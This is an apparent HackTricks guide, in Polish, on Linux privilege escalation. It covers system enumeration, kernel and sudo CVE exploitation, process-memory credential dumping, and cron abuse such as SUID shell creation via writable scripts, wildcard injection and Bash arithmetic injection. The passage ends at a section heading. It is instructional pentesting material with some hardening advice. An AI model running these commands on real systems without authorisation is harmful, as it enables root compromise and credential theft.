# Eskalacja uprawnień w systemie Linux

{{#include ../../../banners/hacktricks-training.md}}

Aby uzyskać szerszy kontekst i poznać historyczne procedury rekonesansu, zapoznaj się z zasobami g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation i linux-private-i wymienionymi w sekcji z odnośnikami.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy od zdobycia pewnej wiedzy o uruchomionym systemie operacyjnym.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Ścieżka

Jeśli **masz uprawnienia do zapisu w dowolnym katalogu znajdującym się w zmiennej `PATH`**, możesz przejąć niektóre biblioteki lub pliki binarne:

```bash
echo $PATH
```

### Informacje o środowisku

Ciekawe informacje, hasła lub klucze API w zmiennych środowiskowych?

```bash
(env || set) 2>/dev/null
```

### Eksploity jądra

Sprawdź wersję jądra i ustal, czy istnieje exploit, którego można użyć do eskalacji uprawnień.

Sekcja [Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) zawiera przypadki lokalnej eskalacji uprawnień oraz linki do bardziej szczegółowych opracowań dotyczących jądra Linux w sekcji Binary Exploitation. Przed przetestowaniem danego przypadku zweryfikuj, czy dotyczy on używanej kompilacji i konfiguracji.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Możesz znaleźć dobrą listę podatnych jąder oraz kilka już **skompilowanych exploitów** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Inne strony, na których znajdziesz **skompilowane exploity**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej strony, możesz wykonać:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Narzędzia, które mogą pomóc w wyszukiwaniu exploitów dla kernela:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchom NA ofierze, sprawdza tylko exploity dla kernela 2.x)

Zawsze **wyszukaj wersję kernela w Google**. Być może Twoja wersja kernela jest wymieniona w jakimś exploicie, dzięki czemu będziesz mieć pewność, że ten exploit jest odpowiedni.

Dodatkowe techniki wykorzystania kernela:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Eskalacja uprawnień w Linuksie — Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Wersja sudo

Na podstawie podatnych wersji sudo, które pojawiają się w:

```bash
searchsploit sudo
```

Możesz sprawdzić, czy wersja sudo jest podatna, za pomocą tego polecenia grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

W upstreamowym sudo **1.9.14–1.9.17** nieuprzywilejowani użytkownicy lokalni mogą uzyskać uprawnienia roota za pomocą opcji `--chroot`, gdy sudo ładuje `/etc/nsswitch.conf` z katalogu kontrolowanego przez użytkownika; upstream naprawił ten problem w wersji **1.9.17p1**. Sprawdź wszystkie pliki binarne sudo z ustawionym bitem setuid roota w odpowiednich ścieżkach, ponieważ `sudo -V` podaje informacje tylko o pliku binarnym wybranym przez `PATH`. Pakiety dystrybucji mogą zawierać poprawkę przeniesioną z nowszej wersji bez zmiany upstreamowego ciągu wersji, dlatego sprawdź też status pakietu dostawcy. Zobacz [advisory opiekuna sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Oto [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) wykorzystujący tę [podatność](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Przed uruchomieniem exploita upewnij się, że Twoja wersja `sudo` jest podatna i obsługuje funkcję `chroot`.

Więcej informacji znajdziesz w oryginalnym [advisory dotyczącym podatności](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Obejście reguł sudo opartych na hoście (CVE-2025-32462)

Upstreamowe sudo **1.8.8–1.9.17** może sprawdzać reguły sudoers oparte na hoście, używając **nazwy hosta podanej przez użytkownika** w `sudo -h <host>` zamiast **rzeczywistej nazwy hosta**; upstream naprawił ten problem w wersji **1.9.17p1**. Użytkownik nadal musi mieć pasujący wpis sudoers dla wybranego hosta. Sprawdź poprawki przeniesione przez dostawcę oraz alternatywne pliki binarne sudo, a także lokalną politykę. Zobacz [advisory opiekuna sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Wymagania:
- Podatna wersja sudo
- Reguły sudoers specyficzne dla hosta (host nie jest ani bieżącą nazwą hosta, ani `ALL`)

Przykładowy wzorzec sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit przez spoofing dozwolonego hosta:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Jeśli rozwiązywanie wybranej nazwy zostanie zablokowane, sprawdź, jak ta nazwa jest rozwiązywana na hoście. Sama obecność nazwy w logu lub pliku konfiguracyjnym nie oznacza, że można ją rozwiązać, a zmiana `/etc/hosts` zwykle wymaga uprzywilejowanego dostępu do zapisu.

#### sudo < v1.8.28

Ten [upstreamowy bypass Runas UID](https://ubuntu.com/security/CVE-2019-14287) wymaga skutecznej reguły sudo, która zezwala na wykonanie polecenia jako dowolny użytkownik z wyjątkiem roota, na przykład `(ALL, !root) /bin/bash`. Wywołujący musi również mieć prawo do użycia tej reguły, w tym spełniać wszelkie wymagania uwierzytelniania. Sprawdź komunikat bezpieczeństwa dotyczący zainstalowanego pakietu: dostawcy przenosili poprawkę do wydań, których wyświetlana wersja upstream nadal jest niższa niż 1.8.28. Sama reguła `!root` lub stara wersja nie potwierdza podatności. Podczas pasywnej enumeracji nie testuj uprzywilejowanego polecenia.

```
sudo -u#-1 /bin/bash
```

### Weryfikacja podpisu dmesg nie powiodła się

Sprawdź box smasher2 z HTB, aby zobaczyć **przykład** wykorzystania tej vuln.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Więcej enumeracji systemu

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Wylicz możliwe zabezpieczenia

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Jeśli znajdujesz się wewnątrz kontenera, zacznij od poniższej sekcji dotyczącej bezpieczeństwa kontenerów, a następnie przejdź do stron poświęconych nadużyciom specyficznym dla danego środowiska uruchomieniowego:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Dyski

Sprawdź, **co jest zamontowane, a co nie**, gdzie i dlaczego. Jeśli coś nie jest zamontowane, możesz spróbować to zamontować i sprawdzić, czy nie zawiera prywatnych informacji.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Przydatne oprogramowanie

Wylistuj przydatne pliki binarne

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Sprawdź też, czy zainstalowany jest **jakikolwiek kompilator**. Przyda się to, jeśli musisz użyć jakiegoś kernel exploita, ponieważ zaleca się skompilować go na maszynie, na której zamierzasz go użyć (lub na podobnej).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Zainstalowane podatne oprogramowanie

Sprawdź **wersje zainstalowanych pakietów i usług**. Być może zainstalowano starą wersję Nagiosa, którą można wykorzystać do eskalacji uprawnień…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Jeśli masz dostęp SSH do maszyny, możesz również użyć **openVAS**, aby sprawdzić, czy na maszynie nie są zainstalowane nieaktualne i podatne na ataki programy.

> [!NOTE] > _Pamiętaj, że te polecenia wyświetlą dużo informacji, które w większości będą bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy którakolwiek z zainstalowanych wersji oprogramowania jest podatna na znane exploity_

## Procesy

Sprawdź, **jakie procesy** są uruchomione, i zweryfikuj, czy któryś z nich ma **większe uprawnienia, niż powinien** (może Tomcat uruchomiony jako root?)

```bash
ps aux
ps -ef
top -n 1
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium** — możesz je wykorzystać do eskalacji uprawnień](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w wierszu poleceń procesu.\
Sprawdź też, **jakie masz uprawnienia do plików binarnych procesów** — może uda Ci się nadpisać któryś z nich.

### Łańcuchy procesów nadrzędnych i potomnych między użytkownikami

Proces potomny działający jako **inny użytkownik** niż jego proces nadrzędny nie jest automatycznie złośliwy, ale stanowi przydatny **sygnał do wstępnej analizy**. Niektóre przejścia są spodziewane (`root` uruchamiający usługę jako inny użytkownik, menedżery logowania tworzące procesy sesji), ale nietypowe łańcuchy mogą ujawniać wrappery, narzędzia debugujące, mechanizmy persistence lub słabe granice zaufania środowiska uruchomieniowego.

Szybki przegląd:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Jeśli znajdziesz zaskakujący łańcuch, sprawdź wiersz poleceń procesu nadrzędnego oraz wszystkie pliki wpływające na jego działanie (`config`, `EnvironmentFile`, skrypty pomocnicze, katalog roboczy i zapisywalne argumenty). W kilku rzeczywistych ścieżkach privesc sam proces potomny nie był zapisywalny, ale **konfiguracja kontrolowana przez proces nadrzędny** lub łańcuch skryptów pomocniczych już tak.

### Usunięte pliki wykonywalne i otwarte pliki oznaczone jako usunięte

Artefakty środowiska uruchomieniowego często pozostają dostępne **po usunięciu**. Przydaje się to zarówno do eskalacji uprawnień, jak i odzyskiwania dowodów z procesu, który nadal ma otwarte poufne pliki.

Sprawdź, czy istnieją usunięte pliki wykonywalne:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Jeśli `/proc/<PID>/exe` wskazuje na `(deleted)`, proces nadal uruchamia stary obraz binarny z pamięci. To mocny sygnał, który warto zbadać, ponieważ:

- usunięty plik wykonywalny może zawierać interesujące ciągi znaków lub dane uwierzytelniające
- działający proces może nadal udostępniać przydatne deskryptory plików
- usunięty plik binarny z podwyższonymi uprawnieniami może wskazywać na niedawną manipulację lub próbę zatarcia śladów

Zbierz globalnie pliki, które są otwarte, ale usunięte:

```bash
lsof +L1
```

Jeśli znajdziesz interesujący deskryptor, odzyskaj go bezpośrednio:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Jest to szczególnie przydatne, gdy proces nadal ma otwarty usunięty sekret, skrypt, eksport bazy danych lub plik z flagą.

### Monitorowanie procesów

Do monitorowania procesów możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy). Może to być bardzo przydatne przy identyfikowaniu podatnych procesów, które są uruchamiane często lub po spełnieniu określonego zestawu warunków.

#### Linux ProcMon z sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) może śledzić wybrane procesy i wywołania systemowe oraz zapisywać ślad w formacie SQLite. Jeśli `sudo -l` zezwala na nieograniczone uruchamianie polecenia `procmon` z uprawnieniami roota, rozważ, czy mogłoby ono monitorować wejście lub wyjście procesu innego użytkownika. To uprawnienie jest jedynie wskazówką do dalszej weryfikacji: znaczenie mają obsługa mechanizmu śledzenia, obowiązująca polityka oraz aktywność odpowiedniego procesu. Pliki śladów mogą zawierać sekrety, dlatego dokładnie analizuj wyeksportowane dane, do których masz uprawniony dostęp, i unikaj zbierania informacji o niezwiązanych procesach.

### Pamięć procesów

Niektóre usługi serwera zapisują **poświadczenia w postaci jawnego tekstu w pamięci**.\
Zwykle do odczytu pamięci procesów należących do innych użytkowników potrzebne są **uprawnienia roota**, dlatego jest to zazwyczaj przydatniejsze, gdy masz już roota i chcesz znaleźć więcej poświadczeń.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz odczytywać pamięć procesów, których jesteś właścicielem**.

> [!WARNING]
> Pamiętaj, że obecnie większość maszyn **domyślnie nie zezwala na ptrace**, co oznacza, że nie możesz zrzucać pamięci innych procesów należących do nieuprzywilejowanego użytkownika.
>
> Dostępność ptrace kontroluje plik _**/proc/sys/kernel/yama/ptrace_scope**_:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam UID. Tak działał ptrace w klasycznym modelu.
> - **kernel.yama.ptrace_scope = 1**: debugować można tylko proces nadrzędny.
> - **kernel.yama.ptrace_scope = 2**: tylko administrator może używać ptrace, ponieważ wymaga to uprawnienia CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: żaden proces nie może być śledzony za pomocą ptrace. Po ustawieniu tej wartości do ponownego włączenia ptrace wymagany jest restart.

Proces działający z tym samym UID, który na krótko odblokowuje sejf haseł, może stanowić odrębną granicę bezpieczeństwa poświadczeń. Gdy śledzenie jest dozwolone, aktywny proces, którego pamięć można zrzucić, może ujawnić hasło do sejfu w wywołaniach systemowych odczytujących wejście lub w pamięci, mimo że sam zaszyfrowany plik sejfu pozostaje chroniony. `ptrace_scope=0` jest tylko jednym z wymaganych warunków: znaczenie mają również zgodność poświadczeń, możliwość zrzucenia pamięci procesu docelowego, inne moduły bezpieczeństwa Linuksa oraz czas działania procesu. To, że wpis z sejfu zawiera dane logowania roota Uniksa, wymaga osobnej weryfikacji możliwości ponownego użycia poświadczeń. Rutynowa enumeracja powinna wskazywać politykę oraz potencjalny proces lub ścieżki do sejfów, a nie przechwytywać wejście ani wyświetlać sekretów. Zobacz [dokumentację Yama w jądrze](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) oraz [kontrole dostępu ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz pobrać Heap i przeszukać go pod kątem jej poświadczeń.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Skrypt GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu **maps pokazuje, jak pamięć jest mapowana w przestrzeni adresowej wirtualnej tego procesu**; pokazuje również **uprawnienia każdego zmapowanego regionu**. Pseudo-plik **mem udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **regiony pamięci są czytelne** i jakie mają przesunięcia. Korzystamy z tych informacji, aby **przejść do odpowiednich miejsc w pliku mem i zrzucić wszystkie czytelne regiony** do pliku.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` zapewnia dostęp do **pamięci fizycznej** systemu, a nie do pamięci wirtualnej. Do przestrzeni adresowej wirtualnej jądra można uzyskać dostęp za pomocą /dev/kmem.\
Zazwyczaj odczyt pliku `/dev/mem` jest dozwolony tylko dla **root** oraz grupy **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump dla Linuxa

ProcDump to linuxowa reinterpretacja klasycznego narzędzia ProcDump z pakietu narzędzi Sysinternals dla Windows. Pobierz je ze strony [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Narzędzia

Aby zrzucić pamięć procesu, możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania dotyczące root i zrzucić pamięć procesu należącego do Ciebie
- Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany jest root)

### Dane uwierzytelniające z pamięci procesu

#### Przykład ręczny

Jeśli zauważysz, że proces uwierzytelniający jest uruchomiony:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Możesz zdumpować proces (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby zrzucenia pamięci procesu) i wyszukać dane uwierzytelniające w pamięci:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **wykrada dane uwierzytelniające w postaci jawnego tekstu z pamięci** oraz z niektórych **powszechnie znanych plików**. Do prawidłowego działania wymaga uprawnień roota.

| Funkcja                                           | Nazwa procesu        |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (pulpit Kali, pulpit Debiana)           | gdm-password         |
| Gnome Keyring (pulpit Ubuntu, pulpit ArchLinux)   | gnome-keyring-daemon |
| LightDM (pulpit Ubuntu)                           | lightdm              |
| VSFTPd (aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (aktywne sesje SSH — użycie Sudo)         | sshd:                |

#### Wyrażenia regularne wyszukiwania/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zaplanowane zadania/Cron

### Crontab UI (alseambusher) działający jako root – eskalacja uprawnień przez scheduler dostępny przez WWW

Jeśli panel „Crontab UI” (alseambusher/crontab-ui) działa jako root i jest dostępny tylko przez loopback, nadal możesz uzyskać do niego dostęp przez lokalne przekierowanie portów SSH i utworzyć uprzywilejowane zadanie, aby dokonać eskalacji.<sup>[[1]](#references)[[4]](#references)</sup>

Typowy przebieg
- Wykryj port dostępny tylko przez loopback (np. 127.0.0.1:8000) i realm Basic-Auth za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź dane uwierzytelniające w artefaktach operacyjnych:
  - Kopie zapasowe/skrypty zawierające `zip -P <password>`
  - Jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Utwórz tunel i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie z wysokimi uprawnieniami i uruchom je natychmiast (tworzy powłokę SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Nie uruchamiaj Crontab UI jako root; użyj dedykowanego użytkownika i minimalnych uprawnień
- Powiąż usługę z localhost i dodatkowo ogranicz dostęp za pomocą firewalla/VPN; nie używaj ponownie haseł
- Unikaj umieszczania sekretów w plikach unit; używaj secret stores lub pliku EnvironmentFile dostępnego tylko dla root
- Włącz audytowanie/logowanie uruchomień zadań na żądanie

Sprawdź, czy jakieś zaplanowane zadanie jest podatne na atak. Być może uda Ci się wykorzystać skrypt uruchamiany przez root (podatność wildcard? Możesz modyfikować pliki używane przez root? Użyć symlinków? Utworzyć w katalogu używanym przez root określone pliki?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Jeśli używane jest `run-parts`, sprawdź, które nazwy zostaną faktycznie uruchomione:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

This pozwala uniknąć fałszywych alarmów. Katalog okresowy z prawem zapisu jest przydatny tylko wtedy, gdy nazwa pliku payloadu spełnia lokalne reguły `run-parts`.

### Ścieżka Cron

Na przykład w pliku _/etc/crontab_ można znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik „user” ma prawo zapisu do /home/user_)

Jeśli w tym crontabie użytkownik root spróbuje wykonać polecenie lub skrypt bez ustawienia ścieżki, na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać powłokę roota, używając:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron używający skryptu z symbolem wieloznacznym (Wildcard Injection)

Jeśli skrypt uruchamiany przez root zawiera „**\***” w poleceniu, możesz to wykorzystać, aby wywołać nieoczekiwane skutki (np. privesc). Przykład:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Jeśli przed wildcardem znajduje się ścieżka, na przykład** _**/some/path/\***_ **, nie jest on podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj poniższą stronę, aby poznać więcej sztuczek związanych z wykorzystaniem wildcardów:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection w parserach logów cron

Bash może interpretować niezaufany tekst jako wyrażenie arytmetyczne. W niektórych kontekstach Bash indeks tablicy wewnątrz takiego wyrażenia może spowodować ewaluację podstawienia polecenia. Jeśli uprzywilejowany cron/parser umieści kontrolowany przez atakującego tekst logu w takim porównaniu arytmetycznym, podstawienie może zostać wykonane z uprawnieniami parsera.<sup>[[22]](#references)</sup> Zależy to od konkretnego wyrażenia Bash i jego wersji; sam ciąg `$(...)0` w rozwiniętej zmiennej nie jest wiarygodnym przykładem ponownej ewaluacji.

Dane wejściowe mogą również pochodzić z metadanych pliku lub innego pola odczytywanego z lokalizacji, do której użytkownik ma prawo zapisu. Na przykład uprzywilejowany skrypt czyszczący, który odczytuje tag `Producer` obrazu i porównuje go za pomocą `[[ "$producer" -eq "expected" ]]`, wykonuje porównanie arytmetyczne, mimo że zmienna jest ujęta w cudzysłów. Sprawdź, z jaką tożsamością uruchamiane jest zadanie, które pliki mogą dostarczyć tag, jakie przekształcenia są wykonywane przed porównaniem oraz jakie jest dokładne zachowanie Bash. W przypadku etykiet tekstowych używaj porównania ciągów znaków; w przypadku liczb przed wykonaniem operacji arytmetycznej sprawdź, czy dane wejściowe zawierają wyłącznie cyfry dziesiętne. Zobacz [zasady arytmetyki Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Typowy podatny wzorzec:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Bezpieczna lokalna sonda zachowania mechanizmu indeksowania tablic (bez uprzywilejowanego procesu ani zmian plików):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Prześledź rzeczywisty zaplanowany skrypt i literalną ścieżkę wejściową, którą otwiera. Nawet jeśli nie można zapisywać do samego pliku dziennika, użytkownik, który może zapisywać w jego katalogu nadrzędnym bez sticky bitu i przechodzić przez niego, może być w stanie podmienić wpis katalogowy; `namei -l` pomaga rozróżnić te uprawnienia. Inna zapisywalna ścieżka dziennika, nieczytelny scheduler albo parser, który nigdy nie interpretuje tego pola jako wyrażenia arytmetycznego Bash, nie potwierdzają tej ścieżki.

### Nadpisywanie skryptu Cron i symlink

Jeśli **możesz zmodyfikować skrypt Cron** wykonywany przez roota, możesz bardzo łatwo uzyskać shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Jeśli skrypt uruchamiany przez roota używa **katalogu, do którego masz pełny dostęp**, przydatne może być usunięcie tego katalogu i **utworzenie katalogu będącego symlinkiem do innego**, w którym znajduje się kontrolowany przez Ciebie skrypt.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Walidacja dowiązań symbolicznych i bezpieczniejsza obsługa plików

Podczas przeglądu uprzywilejowanych skryptów/binarnych, które odczytują lub zapisują pliki na podstawie ścieżki, sprawdź, jak obsługiwane są dowiązania:

- `stat()` podąża za dowiązaniem symbolicznym i zwraca metadane celu.
- `lstat()` zwraca metadane samego dowiązania.
- `readlink -f` i `namei -l` pomagają ustalić końcowy cel i pokazują uprawnienia każdego składnika ścieżki.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Dla obrońców i deweloperów bezpieczniejsze wzorce chroniące przed sztuczkami z symlinkami obejmują:

- `O_EXCL` z `O_CREAT`: niepowodzenie, jeśli ścieżka już istnieje (blokuje wcześniej utworzone przez atakującego linki/pliki).
- `openat()`: działanie względem deskryptora pliku zaufanego katalogu.
- `mkstemp()`: atomowe tworzenie plików tymczasowych z bezpiecznymi uprawnieniami.

### Niestandardowe podpisywane binaria cron z zapisywalnymi payloadami
